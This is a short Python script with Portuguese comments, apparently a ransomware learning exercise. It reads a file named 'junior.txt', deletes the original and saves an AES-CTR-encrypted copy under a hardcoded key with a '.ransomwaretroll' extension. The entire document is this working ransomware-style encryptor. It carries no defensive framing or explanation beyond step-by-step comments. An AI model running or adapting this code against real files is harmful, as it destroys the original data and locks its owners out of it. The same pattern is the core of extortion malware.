import os
import pyaes

## Abre o arquivo a ser criptografado

file_name = "junior.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remove o arquivo original

os.remove(file_name)

## Define a chave para criptografar

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografa o arquivo

crypto_data = aes.encrypt(file_data)

## Salva o arquivo criptografado

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
